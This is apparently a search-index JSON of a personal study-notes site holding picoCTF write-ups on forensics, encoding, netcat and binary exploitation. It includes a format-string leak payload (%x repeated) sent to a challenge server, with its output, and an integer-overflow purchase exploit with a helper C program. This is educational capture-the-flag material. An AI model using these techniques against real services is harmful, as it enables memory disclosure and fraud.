{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"Overview \u00b6 This site contains a series of sub-notebooks that were created and maintained as I've been studying various topics. It should be considered in a perpetual state of flux - if you have any questions, or see any errors, please let me know. Projects \u00b6 A current list of projects are as follows: Hack The Box (HTB) picoCTF PortSwigger Academy RingZer0 Team Online CTF VSRG Testbed","title":"Overview"},{"location":"index.html#overview","text":"This site contains a series of sub-notebooks that were created and maintained as I've been studying various topics. It should be considered in a perpetual state of flux - if you have any questions, or see any errors, please let me know.","title":"Overview"},{"location":"index.html#projects","text":"A current list of projects are as follows: Hack The Box (HTB) picoCTF PortSwigger Academy RingZer0 Team Online CTF VSRG Testbed","title":"Projects"},{"location":"changelog.html","text":"Changelog \u00b6 Rob's Study Notes \u00b6 0.1.11 _ December 13, 2021 \u00b6 Adding initial Linux From Scratch (LFS) material 0.1.10 _ November 30, 2021 \u00b6 PortSwigger Solution: Authentication, Username enumeration via different responses PortSwigger Solution: Authentication, 2FA simple bypass PortSwigger Solution: Authentication, Password reset broken logic Username enumeration via different responses \u00b6 0.1.9 _ November 22, 2021 \u00b6 Adding PortSwigger Academy page PortSwigger Solution: SQL injection vulnerability allowing login bypass PortSwigger Solution: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data PortSwigger Solution: SQL injection UNION attack, determining the number of columns returned by the query PortSwigger Solution: SQL injection UNION attack, finding a column containing text PortSwigger Solution: SQL injection UNION attack, retrieving data from other tables PortSwigger Solution: SQL injection UNION attack, retrieving multiple values in a single column PortSwigger Solution: SQL injection attack, querying the database type and version on Oracle 0.1.8 _ November 3, 2021 \u00b6 picoCTF Solution: Some Assembly Required 1 picoCTF Solution: more cookies picoCTF Solution: where are the robots picoCTF Solution: logon 0.1.6 _ November 2, 2021 \u00b6 Added some notes on password cracking and web exploitation 0.1.5 _ October 29, 2021 \u00b6 Reorganized pages a little and worked on PDF rendering Added License Added Changelog Added Footnote Support Added Password Cracking Notes Replaced Mermaid-based drawings with PNGs picoCTF Solution: Stonks picoCTF Solution: Glory of the Garden picoCTF Solution: So Meta picoCTF Solution: shark on wire 1 picoCTF Solution: extensions picoCTF Solution: What Lies Within 0.1.4 _ October 28, 2021 \u00b6 Adding picoCTF page and initial set of solutions picoCTF Solution: Cookies picoCTF Solution: Insp3ct0r picoCTF Solution: Scavenger Hunt picoCTF Solution: Nice netcat... picoCTF Solution: Static ain't always noise picoCTF Solution: Tab, Tab, Attack picoCTF Solution: Magikarp Ground Mission picoCTF Solution: Lets Warm Up picoCTF Solution: Warmed Up picoCTF Solution: 2Warm picoCTF Solution: what's a net cat? picoCTF Solution: strings it picoCTF Solution: Bases picoCTF Solution: First Grep picoCTF Solution: Based picoCTF Solution: plumbing picoCTF Solution: mus1c picoCTF Solution: flag_shop picoCTF Solution: 1_wanna_b3_a_r0ck5star 0.1.3 _ October 27, 2021 \u00b6 Adding picoCTF page and initial set of solutions picoCTF Solution: GET aHEAD RingZer0 Solution: Hash Me Please RingZer0 Solution: Hash Me Reloaded RingZer0 Solution: I Hate Mathematics RingZer0 Solution: File recovery RingZer0 Solution: Bash Jail 1 RingZer0 Solution: Bash Jail 2 RingZer0 Solution: Client Side Validation Is Bad! RingZer0 Solution: Hashing Is More Secure RingZer0 Solution: Then Obfuscation Is More Secure 0.1.2 _ October 26, 2021 \u00b6 Adding picoCTF page and initial set of solutions 0.1.1 _ October 20, 2021 \u00b6 Adding information about VPN environment within lab Adding RingZer0 CTF page and initial stash of solutions 0.1.0 _ October 6, 2021 \u00b6 Initial release Documentation of lab and testbed environment","title":"Changelog"},{"location":"changelog.html#changelog","text":"","title":"Changelog"},{"location":"changelog.html#robs-study-notes","text":"","title":"Rob's Study Notes"},{"location":"changelog.html#0111-_-december-13-2021","text":"Adding initial Linux From Scratch (LFS) material","title":"0.1.11 _ December 13, 2021"},{"location":"changelog.html#0110-_-november-30-2021","text":"PortSwigger Solution: Authentication, Username enumeration via different responses PortSwigger Solution: Authentication, 2FA simple bypass PortSwigger Solution: Authentication, Password reset broken logic","title":"0.1.10 _ November 30, 2021"},{"location":"changelog.html#username-enumeration-via-different-responses","text":"","title":"Username enumeration via different responses"},{"location":"changelog.html#019-_-november-22-2021","text":"Adding PortSwigger Academy page PortSwigger Solution: SQL injection vulnerability allowing login bypass PortSwigger Solution: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data PortSwigger Solution: SQL injection UNION attack, determining the number of columns returned by the query PortSwigger Solution: SQL injection UNION attack, finding a column containing text PortSwigger Solution: SQL injection UNION attack, retrieving data from other tables PortSwigger Solution: SQL injection UNION attack, retrieving multiple values in a single column PortSwigger Solution: SQL injection attack, querying the database type and version on Oracle","title":"0.1.9 _ November 22, 2021"},{"location":"changelog.html#018-_-november-3-2021","text":"picoCTF Solution: Some Assembly Required 1 picoCTF Solution: more cookies picoCTF Solution: where are the robots picoCTF Solution: logon","title":"0.1.8 _ November 3, 2021"},{"location":"changelog.html#016-_-november-2-2021","text":"Added some notes on password cracking and web exploitation","title":"0.1.6 _ November 2, 2021"},{"location":"changelog.html#015-_-october-29-2021","text":"Reorganized pages a little and worked on PDF rendering Added License Added Changelog Added Footnote Support Added Password Cracking Notes Replaced Mermaid-based drawings with PNGs picoCTF Solution: Stonks picoCTF Solution: Glory of the Garden picoCTF Solution: So Meta picoCTF Solution: shark on wire 1 picoCTF Solution: extensions picoCTF Solution: What Lies Within","title":"0.1.5 _ October 29, 2021"},{"location":"changelog.html#014-_-october-28-2021","text":"Adding picoCTF page and initial set of solutions picoCTF Solution: Cookies picoCTF Solution: Insp3ct0r picoCTF Solution: Scavenger Hunt picoCTF Solution: Nice netcat... picoCTF Solution: Static ain't always noise picoCTF Solution: Tab, Tab, Attack picoCTF Solution: Magikarp Ground Mission picoCTF Solution: Lets Warm Up picoCTF Solution: Warmed Up picoCTF Solution: 2Warm picoCTF Solution: what's a net cat? picoCTF Solution: strings it picoCTF Solution: Bases picoCTF Solution: First Grep picoCTF Solution: Based picoCTF Solution: plumbing picoCTF Solution: mus1c picoCTF Solution: flag_shop picoCTF Solution: 1_wanna_b3_a_r0ck5star","title":"0.1.4 _ October 28, 2021"},{"location":"changelog.html#013-_-october-27-2021","text":"Adding picoCTF page and initial set of solutions picoCTF Solution: GET aHEAD RingZer0 Solution: Hash Me Please RingZer0 Solution: Hash Me Reloaded RingZer0 Solution: I Hate Mathematics RingZer0 Solution: File recovery RingZer0 Solution: Bash Jail 1 RingZer0 Solution: Bash Jail 2 RingZer0 Solution: Client Side Validation Is Bad! RingZer0 Solution: Hashing Is More Secure RingZer0 Solution: Then Obfuscation Is More Secure","title":"0.1.3 _ October 27, 2021"},{"location":"changelog.html#012-_-october-26-2021","text":"Adding picoCTF page and initial set of solutions","title":"0.1.2 _ October 26, 2021"},{"location":"changelog.html#011-_-october-20-2021","text":"Adding information about VPN environment within lab Adding RingZer0 CTF page and initial stash of solutions","title":"0.1.1 _ October 20, 2021"},{"location":"changelog.html#010-_-october-6-2021","text":"Initial release Documentation of lab and testbed environment","title":"0.1.0 _ October 6, 2021"},{"location":"license.html","text":"MIT License Copyright \u00a9 2021 Rob Gillen Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"ctf/htb.html","text":"Hack The Box (HTB) \u00b6 This is where I will document some of my work on hackthebox challenges","title":"Hack The Box (HTB)"},{"location":"ctf/htb.html#hack-the-box-htb","text":"This is where I will document some of my work on hackthebox challenges","title":"Hack The Box (HTB)"},{"location":"ctf/pico-2019.html","text":"Pico CTF 2019 Competition \u00b6 Glory of the Garden \u00b6 Given an image ( garden.jpg ), can you find the flag. Looking at the image didn't show much, and there was nothing immediately obvious in the metadata. Knowing that it is a 50 pt problem, it has to be pretty easy, so I ran strings against it and the last line includes: Here is a flag \"picoCTF{redacted_value}\" So Meta \u00b6 Asked to find the flag in the provided picture: pico_img.png . Probably could have used some image-processing tool to inspect the metadata, but I ran it through strings and immediately found what I was looking for (e.e. $ strings pico_img.png | grep pico ) shark on wire 1 \u00b6 Given a capture file ( capture.pcap ), you are asked to recover the flag. After noodling around a bit, I found the flag, but I wish I had a better way. I searched for pico and found nothing. I then went to Statistics --> Conversations . From there, I started looking around at ones that looked interesting, and started clicking on UDP converstions where there was data being sent back (e.g. B --> A ). After clicking a few and pressing Follow Stream... I found the flag. While this works for the problem, there must be a better way. I read a handful of write-ups, and many people \"just searched\" like I had and seemed to have stumbled upon it. I still don't like that as a sustainable approach, because it feels too much like luck. I then found this writeup which used a bash script with tshark (command-line version of wireshark) to find it. This is a much better approach in my mind. Therefore, in order to ensure I learned from this, I pulled apart the script so I could understand what is going on. I include it below with my comments for clarity, but credit for the script goes to dvd848 #!/bin/bash # this is the file we are interrogating PCAP = shark_on_wire.pcap ; # determine how many UDP streams exist in the file # this number increments so we just grab the last one. END = $( tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1 ) ; # loop through the UDP streams... for (( i = 0 ; i< = END ; i++ )) ; do # for the given stream: # show the data as text, ignoring any errors # remove any line returns via the translate (`tr`) tool # grep/search for \"picoCTF\" tshark -r $PCAP -Y \"udp.stream eq $i \" -T fields -e data.text -o data.show_as_text:TRUE 2 >/dev/null | tr -d '\\n' | grep \"picoCTF\" ; # if the result of the prior command was \"0\" (successful), indicate which stream it was in. if [ $? -eq 0 ] ; then echo \"(Stream # $i )\" ; fi ; done extensions \u00b6 By the name, you can guess that the file extension is wrong. If you run file against it, you see that it believes it to be a png . Running strings shows you nothing, but if you open it in an image viewer you see the flag to submit What Lies Within \u00b6 File is definitely an image. Neither identify or exiftool showed anything interesting. Running strings didn't make anything immediately obvious either. m00nwalk \u00b6 WhitePages \u00b6 c0rrupt \u00b6 like1000 \u00b6 m00nwalk2 \u00b6 Investigative Reversing 0 \u00b6 shark on wire 2 \u00b6 Investigative Reversing 1 \u00b6 Investigative Reversing 2 \u00b6 WebNet0 \u00b6 Investigative Reversing 3 \u00b6 Investigative Reversing 4 \u00b6 WebNet1 \u00b6 investigation_encoded_1 \u00b6 investigation_encoded_2 \u00b6 B1g_Mac \u00b6","title":"2019 Competition"},{"location":"ctf/pico-2019.html#pico-ctf-2019-competition","text":"","title":"Pico CTF 2019 Competition"},{"location":"ctf/pico-2019.html#glory-of-the-garden","text":"Given an image ( garden.jpg ), can you find the flag. Looking at the image didn't show much, and there was nothing immediately obvious in the metadata. Knowing that it is a 50 pt problem, it has to be pretty easy, so I ran strings against it and the last line includes: Here is a flag \"picoCTF{redacted_value}\"","title":"Glory of the Garden"},{"location":"ctf/pico-2019.html#so-meta","text":"Asked to find the flag in the provided picture: pico_img.png . Probably could have used some image-processing tool to inspect the metadata, but I ran it through strings and immediately found what I was looking for (e.e. $ strings pico_img.png | grep pico )","title":"So Meta"},{"location":"ctf/pico-2019.html#shark-on-wire-1","text":"Given a capture file ( capture.pcap ), you are asked to recover the flag. After noodling around a bit, I found the flag, but I wish I had a better way. I searched for pico and found nothing. I then went to Statistics --> Conversations . From there, I started looking around at ones that looked interesting, and started clicking on UDP converstions where there was data being sent back (e.g. B --> A ). After clicking a few and pressing Follow Stream... I found the flag. While this works for the problem, there must be a better way. I read a handful of write-ups, and many people \"just searched\" like I had and seemed to have stumbled upon it. I still don't like that as a sustainable approach, because it feels too much like luck. I then found this writeup which used a bash script with tshark (command-line version of wireshark) to find it. This is a much better approach in my mind. Therefore, in order to ensure I learned from this, I pulled apart the script so I could understand what is going on. I include it below with my comments for clarity, but credit for the script goes to dvd848 #!/bin/bash # this is the file we are interrogating PCAP = shark_on_wire.pcap ; # determine how many UDP streams exist in the file # this number increments so we just grab the last one. END = $( tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1 ) ; # loop through the UDP streams... for (( i = 0 ; i< = END ; i++ )) ; do # for the given stream: # show the data as text, ignoring any errors # remove any line returns via the translate (`tr`) tool # grep/search for \"picoCTF\" tshark -r $PCAP -Y \"udp.stream eq $i \" -T fields -e data.text -o data.show_as_text:TRUE 2 >/dev/null | tr -d '\\n' | grep \"picoCTF\" ; # if the result of the prior command was \"0\" (successful), indicate which stream it was in. if [ $? -eq 0 ] ; then echo \"(Stream # $i )\" ; fi ; done","title":"shark on wire 1"},{"location":"ctf/pico-2019.html#extensions","text":"By the name, you can guess that the file extension is wrong. If you run file against it, you see that it believes it to be a png . Running strings shows you nothing, but if you open it in an image viewer you see the flag to submit","title":"extensions"},{"location":"ctf/pico-2019.html#what-lies-within","text":"File is definitely an image. Neither identify or exiftool showed anything interesting. Running strings didn't make anything immediately obvious either.","title":"What Lies Within"},{"location":"ctf/pico-2019.html#m00nwalk","text":"","title":"m00nwalk"},{"location":"ctf/pico-2019.html#whitepages","text":"","title":"WhitePages"},{"location":"ctf/pico-2019.html#c0rrupt","text":"","title":"c0rrupt"},{"location":"ctf/pico-2019.html#like1000","text":"","title":"like1000"},{"location":"ctf/pico-2019.html#m00nwalk2","text":"","title":"m00nwalk2"},{"location":"ctf/pico-2019.html#investigative-reversing-0","text":"","title":"Investigative Reversing 0"},{"location":"ctf/pico-2019.html#shark-on-wire-2","text":"","title":"shark on wire 2"},{"location":"ctf/pico-2019.html#investigative-reversing-1","text":"","title":"Investigative Reversing 1"},{"location":"ctf/pico-2019.html#investigative-reversing-2","text":"","title":"Investigative Reversing 2"},{"location":"ctf/pico-2019.html#webnet0","text":"","title":"WebNet0"},{"location":"ctf/pico-2019.html#investigative-reversing-3","text":"","title":"Investigative Reversing 3"},{"location":"ctf/pico-2019.html#investigative-reversing-4","text":"","title":"Investigative Reversing 4"},{"location":"ctf/pico-2019.html#webnet1","text":"","title":"WebNet1"},{"location":"ctf/pico-2019.html#investigation_encoded_1","text":"","title":"investigation_encoded_1"},{"location":"ctf/pico-2019.html#investigation_encoded_2","text":"","title":"investigation_encoded_2"},{"location":"ctf/pico-2019.html#b1g_mac","text":"","title":"B1g_Mac"},{"location":"ctf/pico-binex.html","text":"Binary Exploitation \u00b6 Stonks \u00b6 Here you are given a file vuln.c and told that there is a bot to trade \"stonks\" using AI and ML. It looks to be service listening on mercury.picoctf.net 16439 that you can interact with via netcat ( nc ). Probably need to spend some time looking at vuln.c to see what is going on... Well, I somewhat quickly assertained what was going on (format string vulnerability), but I then proved to myself that I had abosolutely no idea how to actually exploit or take advantage of it. I spent way too much time trying to figure things out. What I ended up doing was creating a file called inputs that looks like the following: 1 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x This represents the two inputs I wanted to provide to the program. I then called the program as you would normally expect: $ nc mercury.picoctf.net 16439 < inputs Welcome back to the trading app! What would you like to do ? 1 ) Buy some stonks! 2 ) View my portfolio Using patented AI algorithms to buy stonks Stonks chosen What is your API token? Buying stonks with token: 9aa0390804b00080489c3f7eecd80ffffffff19a9e160f7efa110f7eecdc709a9f18029aa03709aa03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8a007d Portfolio as of Thu Oct 28 20 :20:27 UTC 2021 2 shares of I 6 shares of WJ 22 shares of W 55 shares of ZCVR 1903 shares of Z Goodbye! I assumed that the flag would start with picoCTF{ as most of them had, so I confirmed that I knew that the little-endian hex version of the start of that string was 6f636970 . I identified that portion in the byte string above, took from there to the end and dumped it into cyberchef. I then used a swap endianness tool complete with from hex and I had the flag. I made that way too difficult. One helpful line of code that I don't want to loose: $ python3 -c \"print('%x'*30)\"","title":"Binary Exploitation"},{"location":"ctf/pico-binex.html#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"ctf/pico-binex.html#stonks","text":"Here you are given a file vuln.c and told that there is a bot to trade \"stonks\" using AI and ML. It looks to be service listening on mercury.picoctf.net 16439 that you can interact with via netcat ( nc ). Probably need to spend some time looking at vuln.c to see what is going on... Well, I somewhat quickly assertained what was going on (format string vulnerability), but I then proved to myself that I had abosolutely no idea how to actually exploit or take advantage of it. I spent way too much time trying to figure things out. What I ended up doing was creating a file called inputs that looks like the following: 1 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x This represents the two inputs I wanted to provide to the program. I then called the program as you would normally expect: $ nc mercury.picoctf.net 16439 < inputs Welcome back to the trading app! What would you like to do ? 1 ) Buy some stonks! 2 ) View my portfolio Using patented AI algorithms to buy stonks Stonks chosen What is your API token? Buying stonks with token: 9aa0390804b00080489c3f7eecd80ffffffff19a9e160f7efa110f7eecdc709a9f18029aa03709aa03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8a007d Portfolio as of Thu Oct 28 20 :20:27 UTC 2021 2 shares of I 6 shares of WJ 22 shares of W 55 shares of ZCVR 1903 shares of Z Goodbye! I assumed that the flag would start with picoCTF{ as most of them had, so I confirmed that I knew that the little-endian hex version of the start of that string was 6f636970 . I identified that portion in the byte string above, took from there to the end and dumped it into cyberchef. I then used a swap endianness tool complete with from hex and I had the flag. I made that way too difficult. One helpful line of code that I don't want to loose: $ python3 -c \"print('%x'*30)\"","title":"Stonks"},{"location":"ctf/pico-crypto.html","text":"Cryptography \u00b6 Mod 26 \u00b6 This is a test to see if you know what ROT13 is, and how to encode/deocde from it. You are provided a value ( cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX} ) that looks a bit like a flag and that is all. ROT13 is a substitution cipher where you take one letter in plain text, increase the index by 13, and use the corresponding letter in the \"enciphered\" text. This is a special case of a Caesar cipher because there are 26 letters in the Roman alphabet, the encoder is its own decoder. There are a couple of easy ways to go about solving this. I've listed a few here because I thought they were informative for future challenges: Cyber Chef with a ROT13 recipe gives you the results straight away. This is how I solved it myself (kinda lazy, but effective). I saw some examples using the Linux tr command that I thought were pretty neat. The following example shows how: # simple and straight-forward $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m' picoCTF { redacted_value } # or, let's get a little fancy... # we could/should put this first line in our .bashrc $ alias rot13 = \"tr 'A-Za-z' 'N-ZA-Mn-za-m'\" # then, you can call it directly $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | rot13 picoCTF { redacted_value } I also saw a python one-liner that I thought was nice: $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | python3 -c 'import sys; import codecs; print(codecs.encode(sys.stdin.read(), \"rot13\"))' picoCTF { redacted_value }","title":"Cryptography"},{"location":"ctf/pico-crypto.html#cryptography","text":"","title":"Cryptography"},{"location":"ctf/pico-crypto.html#mod-26","text":"This is a test to see if you know what ROT13 is, and how to encode/deocde from it. You are provided a value ( cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX} ) that looks a bit like a flag and that is all. ROT13 is a substitution cipher where you take one letter in plain text, increase the index by 13, and use the corresponding letter in the \"enciphered\" text. This is a special case of a Caesar cipher because there are 26 letters in the Roman alphabet, the encoder is its own decoder. There are a couple of easy ways to go about solving this. I've listed a few here because I thought they were informative for future challenges: Cyber Chef with a ROT13 recipe gives you the results straight away. This is how I solved it myself (kinda lazy, but effective). I saw some examples using the Linux tr command that I thought were pretty neat. The following example shows how: # simple and straight-forward $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m' picoCTF { redacted_value } # or, let's get a little fancy... # we could/should put this first line in our .bashrc $ alias rot13 = \"tr 'A-Za-z' 'N-ZA-Mn-za-m'\" # then, you can call it directly $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | rot13 picoCTF { redacted_value } I also saw a python one-liner that I thought was nice: $ echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}\" | python3 -c 'import sys; import codecs; print(codecs.encode(sys.stdin.read(), \"rot13\"))' picoCTF { redacted_value }","title":"Mod 26"},{"location":"ctf/pico-forensics.html","text":"Forensics \u00b6 information \u00b6 Here you are presented with an image and asked nothing else. We download the file cat.jpg and inspect it. I immediately assumed there was either a string embedded in the file that was or contained the key. Running strings on the file and then grepping for picoCTF didn't yield anything, but that probably would have been too easy. Opening it with eog and then viewing the metadata, however, showed a weird-looking license. Experimenting with this a little rendered the key: $ strings cat.jpg | grep license | cut -d \"'\" -f 2 | base64 -d picoCTF { redacted_value } Matryoska doll \u00b6 As we are told in the instructions, \"Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another.\" We download dolls.jpg and immediately learn that the file does not render properly with eog . Running file shows it as a PNG file rather than jpg. What followed was a cycle of running binwalk on the file, followed by extracting the contents (e.g. binwalk -e <file_name> ) and a repeat. I did this 3 or 4 times, and the final \"inner\" file was flag.txt . this file contains the flag to be submitted. tunn3l v1s10n \u00b6 We are provided a file, tunn3l_v1s10n and asked to recover the flag.","title":"Forensics"},{"location":"ctf/pico-forensics.html#forensics","text":"","title":"Forensics"},{"location":"ctf/pico-forensics.html#information","text":"Here you are presented with an image and asked nothing else. We download the file cat.jpg and inspect it. I immediately assumed there was either a string embedded in the file that was or contained the key. Running strings on the file and then grepping for picoCTF didn't yield anything, but that probably would have been too easy. Opening it with eog and then viewing the metadata, however, showed a weird-looking license. Experimenting with this a little rendered the key: $ strings cat.jpg | grep license | cut -d \"'\" -f 2 | base64 -d picoCTF { redacted_value }","title":"information"},{"location":"ctf/pico-forensics.html#matryoska-doll","text":"As we are told in the instructions, \"Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another.\" We download dolls.jpg and immediately learn that the file does not render properly with eog . Running file shows it as a PNG file rather than jpg. What followed was a cycle of running binwalk on the file, followed by extracting the contents (e.g. binwalk -e <file_name> ) and a repeat. I did this 3 or 4 times, and the final \"inner\" file was flag.txt . this file contains the flag to be submitted.","title":"Matryoska doll"},{"location":"ctf/pico-forensics.html#tunn3l-v1s10n","text":"We are provided a file, tunn3l_v1s10n and asked to recover the flag.","title":"tunn3l v1s10n"},{"location":"ctf/pico-general.html","text":"General Skills \u00b6 Obedient Cat \u00b6 This is basically a \"test challenge\" to ensure you know how things work. You download the file, read it in a text editor (or just via cat ), and you can recover the flag for submission. $ cat flag picoCTF { redacted_value } Python Wrangling \u00b6 This is a \"can you run python and follow instructions\" challenge. You start with a script ende.py that can encrypt/decrypt a file ( flag.txt.en ) using the password in pw.txt . You can do this in two steps, or in a one-liner as follows: python3 ende.py -d flag.txt.en < pw.txt Please enter the password:picoCTF { redacted_value } Wave a flag \u00b6 This is a simple test to see if you know how to interact with command-line tools by asking for arguments. Additionally, you need to know a little about execute permissions. # make it executable $ chmod +x warm # run it to see what it does $ ./warm Hello user! Pass me a -h to learn what I can do ! # follow the instructions $ ./warm -h Oh, help? I actually don ' t do much, but I do have this flag here: picoCTF { redacted_value } Nice netcat... \u00b6 We are pointed to $ nc mercury.picoctf.net 22902 but told that the program doesn't speak English. Looking at the response, it looks like ascii, so let's dump the data and see if we can do something # get the data and store it in a file called data $ nc mercury.picoctf.net 22902 > data # loop through the file, convert each line to ascii and print it out $ while read ln ; do printf \"\\x $( printf %x $ln ) \" ; done < data picoCTF { redacted_value } Static ain't always noise \u00b6 For this challenge you are provided two files, static and a potentially helpful bash script, ltdis.sh The ltdis.sh script seems like a bit of a sledge hammer... I simply ran strings, grepped for 'pico' and found the flag. $ strings static | grep pico picoCTF { redacted_value } Tab, Tab, Attack \u00b6 The description for this challenge suggests something about tabcomplete and rambling directory structures and filenames. Provided is a zip file, Addadshashanammu.zip . Finding the key is pretty easy: # unzip the file $ unzip Addadshashanammu.zip # cat the deepest-extracted file (looked interesting) $ cat Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet # clear that it is a binary but there is a string version of the flag # let's get it $ strings Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet | grep pico *ZAP!* picoCTF { redacted_value } Magikarp Ground Mission \u00b6 This is just a simple challenge to confirm you know how to ssh, how to navigate around and read files. Once in, cat 1of3.flag.txt , read the instructions file and cat /2of3.flag.txt . Read the instructions file and then cat ~/3of3.flag.txt . Assemble the results and go. Lets Warm Up \u00b6 A simple test to see if you can convert between hex and ASCII characters. # simple lookup table $ man ascii Warning I don't like the instructions for this challenge, because you are expected to calculate the result (easy enough), but then you have to assume how to format the flag (normal format, picoCTF{<value>} ). It's not hard, but the ambiguity isn't helpful. Warmed Up \u00b6 Just need to convert a hex value to decimal $ python -c print ( int ( 0x3D )) 61 2Warm \u00b6 Here we convert a decimal number to a binary string $ python -c 'print(format(42, \"b\"))' 101010 what's a net cat? \u00b6 This is another introduction to netcat. $ nc jupiter.challenges.picoctf.org 41120 You ' re on your way to becoming the net cat master picoCTF { redacted_value } strings it \u00b6 This is getting old now... donwload the file, run strings, submit flag. $ strings strings | grep pico picoCTF { redacted_value } Bases \u00b6 This looks like a base64 conversion question. $ echo \"bDNhcm5fdGgzX3IwcDM1\" | base64 -d redacted_value First Grep \u00b6 Another simple test to see if you can grep # option 1 $ cat file | grep pico picoCTF { redacted_value } # option 2 $ grep \"pico\" file picoCTF { redacted_value } Codebook \u00b6 convertme.py \u00b6 fixme1.py \u00b6 fixme2.py \u00b6 Glitch Cat \u00b6 HashingJobApp \u00b6 PW Crack 1 \u00b6 PW Crack 2 \u00b6 PW Crack 3 \u00b6 PW Crack 4 \u00b6 PW Crack 5 \u00b6 runme.py \u00b6 Serpentine \u00b6 First Find \u00b6 Big Zip \u00b6 Based \u00b6 This is another data encoding challenge. You are given a string of bits (binary) that you need to translate quickly, in this case, within 45 seconds. There are probably a handful of ways to solve this, including a script. Instead, I ended up using the online CyberChef tool to help out. I was presented a binary string that I translated using the From Binary , followed by an octal string for which I used thed from Octal tool, and finally a hexadecimal string where I used the from Hex tool. The easiest way to set up CyberChef for this would be to have three different input tabs, have the appropriate recipies enabled/disabled for each tab, so it is just a matter of copy/paste. Actually , my first solution bothered me as I didn't think it was scalable and wouldn't really help me in the long term. I went back and re-solved it using a Python-based interactive netcat client. The script is available in the assets section. plumbing \u00b6 This one was a bit too easy for 200 points. You connect via nc to a server and are given a bunch of text. Based on what we've seen earlier, it is pretty easy to script/find the flag. $ nc jupiter.challenges.picoctf.org 4427 | grep pico picoCTF { redacted_value } mus1c \u00b6 This one was a bit strange, and as I comment below, a bit of a disapointment. The \"trick\" you need to figure out is that it is actually a program, written in a esoteric programming language called RockStar . If you take the lyrics provided and dump them into the online interpreter , you get a series of values that look quite like ASCII. If you convert those values into ASCII characters (either via a script or online tool such as CyberChef), you'll get the value you can then plug into the flag format for submission. Tip For some dumb reason, I was having trouble figuring out how to convince CyberChef to give me characters from ASCII codes. Come to find out, I was using the wrong recipie. Using the From Decimal tool is all that is needed, and you can change the delimiter to various things such as Line feed which was helpful in this case. Failure I really do not like this type of challenge and am a bit disappointed that it is included in picoCTF. For all of the other challenges, there is a clear pedagogical rationale that maps to building strong cyber security skills. This is simply searching the Internet for a weird phrase from some provided text, assuming you will guess the linking, and plugging some things together. flag_shop \u00b6 This is a simple test to see if you can read source code and if you understand the issues with int roll-overs. You are provided the source code store.c and told to connect to a server via netcat. The keys to this challenge are as follows: Understand the starting balance of 1100 Notice that buying the \"real\" flag costs 100000 Notice that you can buy a number of \"fake\" flags at 900 each. Somehow, we need to get our balance up from 1100 to over 100000 This process of buying fake flags is the only place (other than purchings the real flags) that your account balance is updated. If you try to purchase a stupidly-large number of flags (e.g. 2,500,000), the calculated cost will actually be negative (due to integer rollover). This then subtracts a large negative value from your current balance, effectively adding to it, making you a rich person you can then purchase the flag with ease Hint The key take-away here is that multiplying two int values ( signed ), can easily result in a value larger than INT_MAX . If this is unchecked, it will overflow, resulting in a negative number as the result. I initially did the math to get my purchase number with a calculator, but I then went back and wrote a little program to calculate the optimal value just for learning purposes: #include <stdio.h> #include <stdlib.h> int main () { // these both are signed! int account_balance = 0 ; int number_flags = 0 ; int total_cost = 0 ; do { account_balance = 1100 ; number_flags ++ ; total_cost = 900 * number_flags ; if ( total_cost <= account_balance ) { account_balance = account_balance - total_cost ; } } while ( account_balance < 10000 ); printf ( \" \\n When the number of fake flags ordered is %d \\n \" , number_flags ); printf ( \"The resulting cost is %d \\n \" , total_cost ); printf ( \"And your account balance will be %d \\n \" , account_balance ); } And if we build/run it... $ gcc -g -o mytest mytest.c $ ./mytest When the number of fake flags ordered is 2386095 The resulting cost is -2147481796 And your account balance will be 2147482896 1_wanna_b3_a_r0ck5star \u00b6 Again with the waste-of-time challenges. If you want to waste your 